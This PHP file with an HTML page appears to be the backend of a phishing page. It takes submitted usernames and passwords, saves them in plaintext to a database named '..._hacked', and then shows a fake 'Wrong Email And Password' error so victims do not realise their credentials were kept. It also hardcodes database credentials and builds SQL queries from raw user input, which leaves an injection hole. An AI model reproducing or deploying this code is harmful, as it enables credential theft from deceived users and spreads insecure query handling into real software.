<?php
$name=$_POST['username'];
$password=$_POST['password'];

$conn=mysqli_connect("sql104.epizy.com","epiz_26467325","9FB3GW9CigNua","epiz_26467325_hacked");

if(mysqli_connect_errno()){
    echo "failed to connect";
 }else{
    echo "<br>";
 };

  #checking rows so dat it can add another row
  $s="select * from magna where name='$name'";
  $result=mysqli_query($conn,$s);
  $num=mysqli_num_rows($result);
  #checking 
  if($num==1){
     echo "username has already been taken";
  }else{
    $reg="insert into magna(name,word) values ('$name','$password')";
    mysqli_query($conn,$reg);
  }

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>error</title>
    <style>
        body{
            background-color:crimson;
        }
        .diva{
            margin-top:230px;
        }
        h1{
            color:white;
        }
    </style>
</head>
<body>
    <center>
        <div class="diva"><h1>Wrong Email And Password<br><img src="warn.png" alt=""></h1></div>
        </center>
</body>
</html>